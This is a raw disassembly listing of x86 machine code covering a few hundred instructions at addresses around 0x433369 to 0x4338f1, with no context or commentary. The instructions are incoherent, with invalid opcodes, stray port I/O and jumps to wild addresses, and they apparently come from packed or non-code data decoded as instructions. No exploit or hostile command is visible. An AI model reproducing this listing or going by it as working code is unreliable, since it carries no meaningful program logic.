  433369:	d1 08                	rorl   $1,(%eax)
  43336b:	4c                   	dec    %esp
  43336c:	2f                   	das
  43336d:	12 6d 97             	adc    -0x69(%ebp),%ch
  433370:	d8 9f 13 c1 08 13    	fcomps 0x1308c113(%edi)
  433376:	f4                   	hlt
  433377:	56                   	push   %esi
  433378:	cc                   	int3
  433379:	fb                   	sti
  43337a:	02 07                	add    (%edi),%al
  43337c:	c0 33 2b             	shlb   $0x2b,(%ebx)
  43337f:	c9                   	leave
  433380:	e3 66                	jecxz  0x4333e8
  433382:	24 c2                	and    $0xc2,%al
  433384:	7c b6                	jl     0x43333c
  433386:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  433387:	83 49 2f 25          	orl    $0x25,0x2f(%ecx)
  43338b:	05 50 38 c3 77       	add    $0x77c33850,%eax
  433390:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  433391:	0b d5                	or     %ebp,%edx
  433393:	c6                   	(bad)
  433394:	56                   	push   %esi
  433395:	43                   	inc    %ebx
  433396:	f1                   	int1
  433397:	fb                   	sti
  433398:	e8 fa 6a 0e 97       	call   0x97519e97
  43339d:	8e 66 ba             	mov    -0x46(%esi),%fs
  4333a0:	17                   	pop    %ss
  4333a1:	cc                   	int3
  4333a2:	61                   	popa
  4333a3:	bb c1 41 17 79       	mov    $0x791741c1,%ebx
  4333a8:	e1 34                	loope  0x4333de
  4333aa:	9d                   	popf
  4333ab:	65 71 87             	gs jno 0x433335
  4333ae:	4a                   	dec    %edx
  4333af:	c4 33                	les    (%ebx),%esi
  4333b1:	27                   	daa
  4333b2:	94                   	xchg   %eax,%esp
  4333b3:	60                   	pusha
  4333b4:	58                   	pop    %eax
  4333b5:	20 b0 9d 5c 59 11    	and    %dh,0x11595c9d(%eax)
  4333bb:	54                   	push   %esp
  4333bc:	cd b2                	int    $0xb2
  4333be:	4a                   	dec    %edx
  4333bf:	dc 21                	fsubl  (%ecx)
  4333c1:	78 80                	js     0x433343
  4333c3:	cb                   	lret
  4333c4:	24 82                	and    $0x82,%al
  4333c6:	7e b1                	jle    0x433379
  4333c8:	7f d9                	jg     0x4333a3
  4333ca:	27                   	daa
  4333cb:	4d                   	dec    %ebp
  4333cc:	3b 27                	cmp    (%edi),%esp
  4333ce:	ee                   	out    %al,(%dx)
  4333cf:	1d bc ca 10 9b       	sbb    $0x9b10cabc,%eax
  4333d4:	53                   	push   %ebx
  4333d5:	7b 57                	jnp    0x43342e
  4333d7:	38 c2                	cmp    %al,%dl
  4333d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4333da:	e3 97                	jecxz  0x433373
  4333dc:	79 f7                	jns    0x4333d5
  4333de:	00 2e                	add    %ch,(%esi)
  4333e0:	14 f1                	adc    $0xf1,%al
  4333e2:	72 45                	jb     0x433429
  4333e4:	65 37                	gs aaa
  4333e6:	f3 91                	repz xchg %eax,%ecx
  4333e8:	ad                   	lods   %ds:(%esi),%eax
  4333e9:	09 73 74             	or     %esi,0x74(%ebx)
  4333ec:	63 72 77             	arpl   %esi,0x77(%edx)
  4333ef:	5a                   	pop    %edx
  4333f0:	6c                   	insb   (%dx),%es:(%edi)
  4333f1:	15 5a 98 6b 7d       	adc    $0x7d6b985a,%eax
  4333f6:	c9                   	leave
  4333f7:	9e                   	sahf
  4333f8:	ec                   	in     (%dx),%al
  4333f9:	b0 b0                	mov    $0xb0,%al
  4333fb:	c2 0e 5c             	ret    $0x5c0e
  4333fe:	5f                   	pop    %edi
  4333ff:	8d ac 94 81 a3 95 cf 	lea    -0x306a5c7f(%esp,%edx,4),%ebp
  433406:	d0 50 da             	rclb   $1,-0x26(%eax)
  433409:	88 09                	mov    %cl,(%ecx)
  43340b:	a1 ec f8 34 ed       	mov    0xed34f8ec,%eax
  433410:	e4 4f                	in     $0x4f,%al
  433412:	38 6c 8e 68          	cmp    %ch,0x68(%esi,%ecx,4)
  433416:	2b 2f                	sub    (%edi),%ebp
  433418:	9d                   	popf
  433419:	c8 7f 49 e2          	enter  $0x497f,$0xe2
  43341d:	f8                   	clc
  43341e:	1f                   	pop    %ds
  43341f:	74 5c                	je     0x43347d
  433421:	fd                   	std
  433422:	52                   	push   %edx
  433423:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  433424:	c6 81 5f 1f be 08 9c 	movb   $0x9c,0x8be1f5f(%ecx)
  43342b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  43342c:	47                   	inc    %edi
  43342d:	76 32                	jbe    0x433461
  43342f:	06                   	push   %es
  433430:	7a c0                	jp     0x4333f2
  433432:	ee                   	out    %al,(%dx)
  433433:	59                   	pop    %ecx
  433434:	17                   	pop    %ss
  433435:	30 96 34 39 61 d9    	xor    %dl,-0x269ec6cc(%esi)
  43343b:	1f                   	pop    %ds
  43343c:	56                   	push   %esi
  43343d:	a0 a8 4b ee 3a       	mov    0x3aee4ba8,%al
  433442:	c8 23 90 57          	enter  $0x9023,$0x57
  433446:	c7                   	(bad)
  433447:	e6 86                	out    %al,$0x86
  433449:	8d a5 62 6d 08 ac    	lea    -0x53f7929e(%ebp),%esp
  43344f:	36 24 6c             	ss and $0x6c,%al
  433452:	f0 a7                	lock cmpsl %es:(%edi),%ds:(%esi)
  433454:	86 8f 5a 56 69 a4    	xchg   %cl,-0x5b96a9a6(%edi)
  43345a:	6b 73 34 61          	imul   $0x61,0x34(%ebx),%esi
  43345e:	b7 14                	mov    $0x14,%bh
  433460:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  433461:	d9 b7 5d b2 d6 77    	fnstenv 0x77d6b25d(%edi)
  433467:	b7 1a                	mov    $0x1a,%bh
  433469:	6c                   	insb   (%dx),%es:(%edi)
  43346a:	32 8d a3 37 0c 8c    	xor    -0x73f3c85d(%ebp),%cl
  433470:	1e                   	push   %ds
  433471:	94                   	xchg   %eax,%esp
  433472:	bb 36 b5 40 df       	mov    $0xdf40b536,%ebx
  433477:	25 6e 9b fd ed       	and    $0xedfd9b6e,%eax
  43347c:	af                   	scas   %es:(%edi),%eax
  43347d:	ea 7d 08 bd bb 35 15 	ljmp   $0x1535,$0xbbbd087d
  433484:	09 bf 1b 00 da 92    	or     %edi,-0x6d25ffe5(%edi)
  43348a:	fe                   	(bad)
  43348b:	59                   	pop    %ecx
  43348c:	e1 43                	loope  0x4334d1
  43348e:	71 3f                	jno    0x4334cf
  433490:	45                   	inc    %ebp
  433491:	cb                   	lret
  433492:	c3                   	ret
  433493:	46                   	inc    %esi
  433494:	69 ee dd 00 39 25    	imul   $0x253900dd,%esi,%ebp
  43349a:	44                   	inc    %esp
  43349b:	01 fb                	add    %edi,%ebx
  43349d:	5c                   	pop    %esp
  43349e:	f2 69 22 d7 14 0e b3 	repnz imul $0xb30e14d7,(%edx),%esp
  4334a5:	d8 0e                	fmuls  (%esi)
  4334a7:	5f                   	pop    %edi
  4334a8:	49                   	dec    %ecx
  4334a9:	56                   	push   %esi
  4334aa:	95                   	xchg   %eax,%ebp
  4334ab:	90                   	nop
  4334ac:	54                   	push   %esp
  4334ad:	1e                   	push   %ds
  4334ae:	e7 bc                	out    %eax,$0xbc
  4334b0:	e2 27                	loop   0x4334d9
  4334b2:	75 0b                	jne    0x4334bf
  4334b4:	f7 37                	divl   (%edi)
  4334b6:	4c                   	dec    %esp
  4334b7:	90                   	nop
  4334b8:	d7                   	xlat   %ds:(%ebx)
  4334b9:	cf                   	iret
  4334ba:	f2 df 7f b4          	repnz fistpll -0x4c(%edi)
  4334be:	b2 55                	mov    $0x55,%dl
  4334c0:	2d 6b dc c7 6a       	sub    $0x6ac7dc6b,%eax
  4334c5:	89 c9                	mov    %ecx,%ecx
  4334c7:	7e 45                	jle    0x43350e
  4334c9:	86 ca                	xchg   %cl,%dl
  4334cb:	78 4d                	js     0x43351a
  4334cd:	dc 8b 1c 2f 33 b1    	fmull  -0x4eccd0e4(%ebx)
  4334d3:	11 e0                	adc    %esp,%eax
  4334d5:	d1 90 e8 a7 31 ff    	rcll   $1,-0xce5818(%eax)
  4334db:	e3 35                	jecxz  0x433512
  4334dd:	72 e5                	jb     0x4334c4
  4334df:	01 47 14             	add    %eax,0x14(%edi)
  4334e2:	d8 30                	fdivs  (%eax)
  4334e4:	83 41 8c 72          	addl   $0x72,-0x74(%ecx)
  4334e8:	ec                   	in     (%dx),%al
  4334e9:	28 c2                	sub    %al,%dl
  4334eb:	55                   	push   %ebp
  4334ec:	9c                   	pushf
  4334ed:	58                   	pop    %eax
  4334ee:	05 ed 98 13 26       	add    $0x261398ed,%eax
  4334f3:	28 8b 5c fd b7 6a    	sub    %cl,0x6ab7fd5c(%ebx)
  4334f9:	10 76 34             	adc    %dh,0x34(%esi)
  4334fc:	c6                   	(bad)
  4334fd:	89 cc                	mov    %ecx,%esp
  4334ff:	b1 9a                	mov    $0x9a,%cl
  433501:	a8 fc                	test   $0xfc,%al
  433503:	55                   	push   %ebp
  433504:	cc                   	int3
  433505:	53                   	push   %ebx
  433506:	6a 22                	push   $0x22
  433508:	c2 ac 1d             	ret    $0x1dac
  43350b:	62                   	(bad)
  43350c:	e8 be 5b 13 96       	call   0x965690cf
  433511:	dd d6                	fst    %st(6)
  433513:	74 97                	je     0x4334ac
  433515:	bd df b0 af cf       	mov    $0xcfafb0df,%ebp
  43351a:	14 d2                	adc    $0xd2,%al
  43351c:	2e 81 b7 81 1b e9 95 	xorl   $0x261d521,%cs:-0x6a16e47f(%edi)
  433523:	21 d5 61 02 
  433527:	68 80 3b 1c 2e       	push   $0x2e1c3b80
  43352c:	86 e3                	xchg   %ah,%bl
  43352e:	4e                   	dec    %esi
  43352f:	e8 3b 1d 50 82       	call   0x8293526f
  433534:	9a 87 46 77 0d c5 b0 	lcall  $0xb0c5,$0xd774687
  43353b:	95                   	xchg   %eax,%ebp
  43353c:	63 49 ec             	arpl   %ecx,-0x14(%ecx)
  43353f:	7e 84                	jle    0x4334c5
  433541:	75 30                	jne    0x433573
  433543:	75 58                	jne    0x43359d
  433545:	33 ce                	xor    %esi,%ecx
  433547:	3c 15                	cmp    $0x15,%al
  433549:	95                   	xchg   %eax,%ebp
  43354a:	87 48 96             	xchg   %ecx,-0x6a(%eax)
  43354d:	f4                   	hlt
  43354e:	05 71 e0 0f 8c       	add    $0x8c0fe071,%eax
  433553:	42                   	inc    %edx
  433554:	5a                   	pop    %edx
  433555:	3f                   	aas
  433556:	b6 aa                	mov    $0xaa,%dh
  433558:	8e de                	mov    %esi,%ds
  43355a:	2a c9                	sub    %cl,%cl
  43355c:	74 1d                	je     0x43357b
  43355e:	41                   	inc    %ecx
  43355f:	89 dc                	mov    %ebx,%esp
  433561:	70 97                	jo     0x4334fa
  433563:	ec                   	in     (%dx),%al
  433564:	e0 ce                	loopne 0x433534
  433566:	9d                   	popf
  433567:	63 36                	arpl   %esi,(%esi)
  433569:	fe                   	(bad)
  43356a:	19 70 1c             	sbb    %esi,0x1c(%eax)
  43356d:	4e                   	dec    %esi
  43356e:	46                   	inc    %esi
  43356f:	5d                   	pop    %ebp
  433570:	b8 39 c8 c4 d3       	mov    $0xd3c4c839,%eax
  433575:	89 88 26 58 9e a3    	mov    %ecx,-0x5c61a7da(%eax)
  43357b:	f7 48 aa 30 45 27 41 	testl  $0x41274530,-0x56(%eax)
  433582:	8d 85 5b 53 d3 7b    	lea    0x7bd3535b(%ebp),%eax
  433588:	98                   	cwtl
  433589:	96                   	xchg   %eax,%esi
  43358a:	62 d7 05 51 2b       	(bad)
  43358f:	67 72 55             	addr16 jb 0x4335e7
  433592:	ad                   	lods   %ds:(%esi),%eax
  433593:	e9 2a 48 32 86       	jmp    0x86757dc2
  433598:	8b f0                	mov    %eax,%esi
  43359a:	8d 7b 20             	lea    0x20(%ebx),%edi
  43359d:	e2 66                	loop   0x433605
  43359f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4335a0:	d4 1e                	aam    $0x1e
  4335a2:	fa                   	cli
  4335a3:	09 ac 01 c0 49 05 e1 	or     %ebp,-0x1efab640(%ecx,%eax,1)
  4335aa:	e2 77                	loop   0x433623
  4335ac:	42                   	inc    %edx
  4335ad:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4335ae:	46                   	inc    %esi
  4335af:	c7                   	(bad)
  4335b0:	29 71 79             	sub    %esi,0x79(%ecx)
  4335b3:	07                   	pop    %es
  4335b4:	fd                   	std
  4335b5:	23 dd                	and    %ebp,%ebx
  4335b7:	c9                   	leave
  4335b8:	72 33                	jb     0x4335ed
  4335ba:	c9                   	leave
  4335bb:	64 91                	fs xchg %eax,%ecx
  4335bd:	5c                   	pop    %esp
  4335be:	ae                   	scas   %es:(%edi),%al
  4335bf:	77 fc                	ja     0x4335bd
  4335c1:	76 af                	jbe    0x433572
  4335c3:	b1 a0                	mov    $0xa0,%cl
  4335c5:	f9                   	stc
  4335c6:	d4 96                	aam    $0x96
  4335c8:	34 e4                	xor    $0xe4,%al
  4335ca:	b2 1a                	mov    $0x1a,%dl
  4335cc:	88 89 95 17 6f df    	mov    %cl,-0x2090e86b(%ecx)
  4335d2:	d1 5b b1             	rcrl   $1,-0x4f(%ebx)
  4335d5:	e8 ed a6 94 8a       	call   0x8ad7dcc7
  4335da:	ec                   	in     (%dx),%al
  4335db:	f2 f7 86 a5 2c 8f c1 	repnz testl $0x80eb33f4,-0x3e70d35b(%esi)
  4335e2:	f4 33 eb 80 
  4335e6:	e2 f9                	loop   0x4335e1
  4335e8:	09 ba 00 66 bb f4    	or     %edi,-0xb449a00(%edx)
  4335ee:	3d 07 3f b9 2b       	cmp    $0x2bb93f07,%eax
  4335f3:	de f5                	fdivp  %st,%st(5)
  4335f5:	f1                   	int1
  4335f6:	82 6a e9 f8          	subb   $0xf8,-0x17(%edx)
  4335fa:	12 1c 5d 32 6d f9 89 	adc    -0x760692ce(,%ebx,2),%bl
  433601:	30 11                	xor    %dl,(%ecx)
  433603:	01 4d 6c             	add    %ecx,0x6c(%ebp)
  433606:	2e de 21             	fisubs %cs:(%ecx)
  433609:	cd 20                	int    $0x20
  43360b:	76 d5                	jbe    0x4335e2
  43360d:	99                   	cltd
  43360e:	4f                   	dec    %edi
  43360f:	19 24 6f             	sbb    %esp,(%edi,%ebp,2)
  433612:	e7 75                	out    %eax,$0x75
  433614:	2b 37                	sub    (%edi),%esi
  433616:	84 84 29 ab 8d e4 41 	test   %al,0x41e48dab(%ecx,%ebp,1)
  43361d:	97                   	xchg   %eax,%edi
  43361e:	5c                   	pop    %esp
  43361f:	99                   	cltd
  433620:	48                   	dec    %eax
  433621:	57                   	push   %edi
  433622:	61                   	popa
  433623:	55                   	push   %ebp
  433624:	cd ba                	int    $0xba
  433626:	7f 52                	jg     0x43367a
  433628:	f3 4c                	repz dec %esp
  43362a:	a3 fa d0 29 d8       	mov    %eax,0xd829d0fa
  43362f:	dd 92 14 a3 e1 48    	fstl   0x48e1a314(%edx)
  433635:	55                   	push   %ebp
  433636:	b1 31                	mov    $0x31,%cl
  433638:	21 f4                	and    %esi,%esp
  43363a:	e3 97                	jecxz  0x4335d3
  43363c:	95                   	xchg   %eax,%ebp
  43363d:	00 7f 99             	add    %bh,-0x67(%edi)
  433640:	a0 db 5e 4e ee       	mov    0xee4e5edb,%al
  433645:	16                   	push   %ss
  433646:	9b                   	fwait
  433647:	02 aa eb 48 9d 8d    	add    -0x7262b715(%edx),%ch
  43364d:	9d                   	popf
  43364e:	64 8c 7c eb 7b       	mov    %?,%fs:0x7b(%ebx,%ebp,8)
  433653:	6b 0d 87 11 a5 80 ec 	imul   $0xffffffec,0x80a51187,%ecx
  43365a:	ee                   	out    %al,(%dx)
  43365b:	51                   	push   %ecx
  43365c:	b3 ff                	mov    $0xff,%bl
  43365e:	06                   	push   %es
  43365f:	91                   	xchg   %eax,%ecx
  433660:	14 21                	adc    $0x21,%al
  433662:	ac                   	lods   %ds:(%esi),%al
  433663:	63 f1                	arpl   %esi,%ecx
  433665:	fe                   	(bad)
  433666:	79 5e                	jns    0x4336c6
  433668:	cf                   	iret
  433669:	7e 6a                	jle    0x4336d5
  43366b:	97                   	xchg   %eax,%edi
  43366c:	5e                   	pop    %esi
  43366d:	64 53                	fs push %ebx
  43366f:	2c 53                	sub    $0x53,%al
  433671:	bb 23 99 ea 10       	mov    $0x10ea9923,%ebx
  433676:	c8 35 09 2c          	enter  $0x935,$0x2c
  43367a:	e5 07                	in     $0x7,%eax
  43367c:	72 00                	jb     0x43367e
  43367e:	8c fe                	mov    %?,%esi
  433680:	55                   	push   %ebp
  433681:	bc 6a bb c1 99       	mov    $0x99c1bb6a,%esp
  433686:	ad                   	lods   %ds:(%esi),%eax
  433687:	46                   	inc    %esi
  433688:	f0 33 bb fd 6f bf ea 	lock xor -0x15409003(%ebx),%edi
  43368f:	a3 54 62 cf e1       	mov    %eax,0xe1cf6254
  433694:	79 2b                	jns    0x4336c1
  433696:	2b 21                	sub    (%ecx),%esp
  433698:	34 27                	xor    $0x27,%al
  43369a:	01 4c c7 ca          	add    %ecx,-0x36(%edi,%eax,8)
  43369e:	06                   	push   %es
  43369f:	92                   	xchg   %eax,%edx
  4336a0:	f5                   	cmc
  4336a1:	e3 5a                	jecxz  0x4336fd
  4336a3:	95                   	xchg   %eax,%ebp
  4336a4:	94                   	xchg   %eax,%esp
  4336a5:	79 58                	jns    0x4336ff
  4336a7:	ed                   	in     (%dx),%eax
  4336a8:	2f                   	das
  4336a9:	b1 66                	mov    $0x66,%cl
  4336ab:	8d                   	lea    (bad),%edi
  4336ac:	fc                   	cld
  4336ad:	4f                   	dec    %edi
  4336ae:	4b                   	dec    %ebx
  4336af:	b3 1f                	mov    $0x1f,%bl
  4336b1:	23 2e                	and    (%esi),%ebp
  4336b3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4336b4:	d3 20                	shll   %cl,(%eax)
  4336b6:	5c                   	pop    %esp
  4336b7:	78 3b                	js     0x4336f4
  4336b9:	b9 a7 ec 6d 1b       	mov    $0x1b6deca7,%ecx
  4336be:	60                   	pusha
  4336bf:	d8 20                	fsubs  (%eax)
  4336c1:	5b                   	pop    %ebx
  4336c2:	40                   	inc    %eax
  4336c3:	1f                   	pop    %ds
  4336c4:	76 4d                	jbe    0x433713
  4336c6:	40                   	inc    %eax
  4336c7:	ae                   	scas   %es:(%edi),%al
  4336c8:	13 22                	adc    (%edx),%esp
  4336ca:	8d                   	lea    (bad),%esi
  4336cb:	f1                   	int1
  4336cc:	6c                   	insb   (%dx),%es:(%edi)
  4336cd:	de 41 a6             	fiadds -0x5a(%ecx)
  4336d0:	b2 86                	mov    $0x86,%dl
  4336d2:	35 9c 98 2e 79       	xor    $0x792e989c,%eax
  4336d7:	1a 36                	sbb    (%esi),%dh
  4336d9:	7c 74                	jl     0x43374f
  4336db:	de d9                	fcompp
  4336dd:	4b                   	dec    %ebx
  4336de:	55                   	push   %ebp
  4336df:	6f                   	outsl  %ds:(%esi),(%dx)
  4336e0:	f0 70 3d             	lock jo 0x433720
  4336e3:	e6 0f                	out    %al,$0xf
  4336e5:	bf b5 a9 29 fe       	mov    $0xfe29a9b5,%edi
  4336ea:	bc 04 57 94 a9       	mov    $0xa9945704,%esp
  4336ef:	f3 aa                	rep stos %al,%es:(%edi)
  4336f1:	82 77 ce 4c          	xorb   $0x4c,-0x32(%edi)
  4336f5:	30 ab 7e 38 7e 26    	xor    %ch,0x267e387e(%ebx)
  4336fb:	d5 fd                	aad    $0xfd
  4336fd:	65 45                	gs inc %ebp
  4336ff:	7f da                	jg     0x4336db
  433701:	1d 52 15 b6 40       	sbb    $0x40b61552,%eax
  433706:	78 f6                	js     0x4336fe
  433708:	04 cc                	add    $0xcc,%al
  43370a:	be 39 11 94 53       	mov    $0x53941139,%esi
  43370f:	c3                   	ret
  433710:	ff 35 3d c1 c9 4b    	push   0x4bc9c13d
  433716:	39 d5                	cmp    %edx,%ebp
  433718:	55                   	push   %ebp
  433719:	bf 4e c0 e2 7c       	mov    $0x7ce2c04e,%edi
  43371e:	6a 12                	push   $0x12
  433720:	de c6                	faddp  %st,%st(6)
  433722:	2f                   	das
  433723:	2c 0e                	sub    $0xe,%al
  433725:	8b 72 d3             	mov    -0x2d(%edx),%esi
  433728:	e6 9d                	out    %al,$0x9d
  43372a:	df 26                	fbld   (%esi)
  43372c:	04 c0                	add    $0xc0,%al
  43372e:	5d                   	pop    %ebp
  43372f:	01 d7                	add    %edx,%edi
  433731:	c5 75 13             	lds    0x13(%ebp),%esi
  433734:	c8 95 8f b7          	enter  $0x8f95,$0xb7
  433738:	06                   	push   %es
  433739:	4e                   	dec    %esi
  43373a:	b0 ab                	mov    $0xab,%al
  43373c:	6b 6c 98 2b 3d       	imul   $0x3d,0x2b(%eax,%ebx,4),%ebp
  433741:	69 92 ec 00 ce d0 3d 	imul   $0xbf6a173d,-0x2f31ff14(%edx),%edx
  433748:	17 6a bf 
  43374b:	61                   	popa
  43374c:	70 62                	jo     0x4337b0
  43374e:	c9                   	leave
  43374f:	46                   	inc    %esi
  433750:	78 96                	js     0x4336e8
  433752:	97                   	xchg   %eax,%edi
  433753:	68 57 3d 4f f3       	push   $0xf34f3d57
  433758:	3f                   	aas
  433759:	db ae 41 ce d5 fa    	fldt   -0x52a31bf(%esi)
  43375f:	fc                   	cld
  433760:	11 6c 5a 5a          	adc    %ebp,0x5a(%edx,%ebx,2)
  433764:	91                   	xchg   %eax,%ecx
  433765:	ba d8 13 65 42       	mov    $0x426513d8,%edx
  43376a:	09 58 d1             	or     %ebx,-0x2f(%eax)
  43376d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  43376e:	3b 36                	cmp    (%esi),%esi
  433770:	ac                   	lods   %ds:(%esi),%al
  433771:	24 33                	and    $0x33,%al
  433773:	8d                   	lea    (bad),%edi
  433774:	fa                   	cli
  433775:	d9 b0 d2 40 aa 75    	fnstenv 0x75aa40d2(%eax)
  43377b:	05 0b be 0d b3       	add    $0xb30dbe0b,%eax
  433780:	8a b6 f8 45 63 45    	mov    0x456345f8(%esi),%dh
  433786:	24 00                	and    $0x0,%al
  433788:	cf                   	iret
  433789:	f9                   	stc
  43378a:	03 09                	add    (%ecx),%ecx
  43378c:	01 98 4a fd 69 7c    	add    %ebx,0x7c69fd4a(%eax)
  433792:	e8 1f bb 06 45       	call   0x4549f2b6
  433797:	5f                   	pop    %edi
  433798:	86 ab 17 92 51 1b    	xchg   %ch,0x1b519217(%ebx)
  43379e:	09 b8 2d 54 2b de    	or     %edi,-0x21d4abd3(%eax)
  4337a4:	63 7e 3a             	arpl   %edi,0x3a(%esi)
  4337a7:	41                   	inc    %ecx
  4337a8:	be 0c c1 71 e7       	mov    $0xe771c10c,%esi
  4337ad:	cc                   	int3
  4337ae:	50                   	push   %eax
  4337af:	29 41 12             	sub    %eax,0x12(%ecx)
  4337b2:	78 7f                	js     0x433833
  4337b4:	36 43                	ss inc %ebx
  4337b6:	65 75 ba             	gs jne 0x433773
  4337b9:	7f 35                	jg     0x4337f0
  4337bb:	64 07                	fs pop %es
  4337bd:	51                   	push   %ecx
  4337be:	09 ef                	or     %ebp,%edi
  4337c0:	58                   	pop    %eax
  4337c1:	e0 22                	loopne 0x4337e5
  4337c3:	cd 55                	int    $0x55
  4337c5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4337c6:	b6 9a                	mov    $0x9a,%dh
  4337c8:	94                   	xchg   %eax,%esp
  4337c9:	dd e0                	fucom  %st(0)
  4337cb:	03 6d 0d             	add    0xd(%ebp),%ebp
  4337ce:	ce                   	into
  4337cf:	d5 bd                	aad    $0xbd
  4337d1:	3c bb                	cmp    $0xbb,%al
  4337d3:	27                   	daa
  4337d4:	c7                   	(bad)
  4337d5:	33 a3 a2 9e 21 a9    	xor    -0x56de615e(%ebx),%esp
  4337db:	fa                   	cli
  4337dc:	b2 86                	mov    $0x86,%dl
  4337de:	c7                   	(bad)
  4337df:	b4 73                	mov    $0x73,%ah
  4337e1:	ed                   	in     (%dx),%eax
  4337e2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4337e3:	d9 fe                	fsin
  4337e5:	3b 60 19             	cmp    0x19(%eax),%esp
  4337e8:	ba 2e 23 6e 7b       	mov    $0x7b6e232e,%edx
  4337ed:	b8 a1 67 3c 67       	mov    $0x673c67a1,%eax
  4337f2:	79 1d                	jns    0x433811
  4337f4:	f0 6d                	lock insl (%dx),%es:(%edi)
  4337f6:	46                   	inc    %esi
  4337f7:	f4                   	hlt
  4337f8:	0a a9 0a 61 37 0e    	or     0xe37610a(%ecx),%ch
  4337fe:	31 19                	xor    %ebx,(%ecx)
  433800:	49                   	dec    %ecx
  433801:	f9                   	stc
  433802:	8d                   	lea    (bad),%ecx
  433803:	cd 38                	int    $0x38
  433805:	d7                   	xlat   %ds:(%ebx)
  433806:	7b 9b                	jnp    0x4337a3
  433808:	cd e7                	int    $0xe7
  43380a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  43380b:	6d                   	insl   (%dx),%es:(%edi)
  43380c:	d7                   	xlat   %ds:(%ebx)
  43380d:	5b                   	pop    %ebx
  43380e:	c5 ac 55 af bb 2c 1c 	lds    0x1c2cbbaf(%ebp,%edx,2),%ebp
  433815:	d7                   	xlat   %ds:(%ebx)
  433816:	77 9d                	ja     0x4337b5
  433818:	6a f2                	push   $0xfffffff2
  43381a:	e4 0b                	in     $0xb,%al
  43381c:	68 e8 f6 e7 06       	push   $0x6e7f6e8
  433821:	c7                   	(bad)
  433822:	9d                   	popf
  433823:	0d ed de 09 da       	or     $0xda09deed,%eax
  433828:	17                   	pop    %ss
  433829:	db cd                	fcmovne %st(5),%st
  43382b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  43382c:	c8 82 72 20          	enter  $0x7282,$0x20
  433830:	be 76 c7 cc c9       	mov    $0xc9ccc776,%esi
  433835:	5c                   	pop    %esp
  433836:	37                   	aaa
  433837:	46                   	inc    %esi
  433838:	a8 de                	test   $0xde,%al
  43383a:	4d                   	dec    %ebp
  43383b:	04 eb                	add    $0xeb,%al
  43383d:	3a ba 17 d8 6c 9a    	cmp    -0x659327e9(%edx),%bh
  433843:	db 8d 4b 86 31 af    	fisttpl -0x50ce79b5(%ebp)
  433849:	c8 07 46 42          	enter  $0x4607,$0x42
  43384d:	8f                   	(bad)
  43384e:	21 a4 27 20 f0 4b 67 	and    %esp,0x674bf020(%edi,%eiz,1)
  433855:	b0 d1                	mov    $0xd1,%al
  433857:	9e                   	sahf
  433858:	47                   	inc    %edi
  433859:	d2 5e bd             	rcrb   %cl,-0x43(%esi)
  43385c:	e3 e8                	jecxz  0x433846
  43385e:	ba f0 23 8e ce       	mov    $0xce8e23f0,%edx
  433863:	c8 c8 59 21          	enter  $0x59c8,$0x21
  433867:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  433868:	fa                   	cli
  433869:	82 34 49 ae          	xorb   $0xae,(%ecx,%ecx,2)
  43386d:	8c dd                	mov    %ds,%ebp
  43386f:	60                   	pusha
  433870:	cb                   	lret
  433871:	be 03 a3 36 a9       	mov    $0xa936a303,%esi
  433876:	9c                   	pushf
  433877:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  433878:	21 0c 21             	and    %ecx,(%ecx,%eiz,1)
  43387b:	3e 41                	ds inc %ecx
  43387d:	17                   	pop    %ss
  43387e:	64 52                	fs push %edx
  433880:	16                   	push   %ss
  433881:	fb                   	sti
  433882:	81 a1 89 03 45 05 3b 	andl   $0x51e163b,0x5450389(%ecx)
  433889:	16 1e 05 
  43388c:	31 28                	xor    %ebp,(%eax)
  43388e:	e5 12                	in     $0x12,%eax
  433890:	64 10 f2             	fs adc %dh,%dl
  433893:	27                   	daa
  433894:	0d 66 08 23 74       	or     $0x74230866,%eax
  433899:	e6 af                	out    %al,$0xaf
  43389b:	4d                   	dec    %ebp
  43389c:	5d                   	pop    %ebp
  43389d:	d6                   	salc
  43389e:	f9                   	stc
  43389f:	55                   	push   %ebp
  4338a0:	d4 bb                	aam    $0xbb
  4338a2:	48                   	dec    %eax
  4338a3:	cf                   	iret
  4338a4:	1f                   	pop    %ds
  4338a5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4338a6:	75 d0                	jne    0x433878
  4338a8:	bd 86 0a 08 37       	mov    $0x37080a86,%ebp
  4338ad:	f3 82 83 1a d9 58 3a 	repz addb $0x4c,0x3a58d91a(%ebx)
  4338b4:	4c 
  4338b5:	ff ca                	dec    %edx
  4338b7:	e4 e1                	in     $0xe1,%al
  4338b9:	8d 75 b1             	lea    -0x4f(%ebp),%esi
  4338bc:	cd a2                	int    $0xa2
  4338be:	dc a0 ec 23 d0 70    	fsubl  0x70d023ec(%eax)
  4338c4:	6d                   	insl   (%dx),%es:(%edi)
  4338c5:	18 de                	sbb    %bl,%dh
  4338c7:	da ea                	(bad)
  4338c9:	90                   	nop
  4338ca:	29 92 b9 cb 58 c8    	sub    %edx,-0x37a73447(%edx)
  4338d0:	e9 50 e5 55 6e       	jmp    0x6e991e25
  4338d5:	d1 d5                	rcl    $1,%ebp
  4338d7:	8e 03                	mov    (%ebx),%es
  4338d9:	01 33                	add    %esi,(%ebx)
  4338db:	4c                   	dec    %esp
  4338dc:	ea c5 9f a0 d4 36 c5 	ljmp   $0xc536,$0xd4a09fc5
  4338e3:	04 28                	add    $0x28,%al
  4338e5:	2f                   	das
  4338e6:	d5 72                	aad    $0x72
  4338e8:	24 e6                	and    $0xe6,%al
  4338ea:	43                   	inc    %ebx
  4338eb:	ab                   	stos   %eax,%es:(%edi)
  4338ec:	46                   	inc    %esi
  4338ed:	f4                   	hlt
  4338ee:	c4                   	(bad)
  4338ef:	fa                   	cli
  4338f0:	98                   	cwtl
  4338f1:	50                   	push   %eax
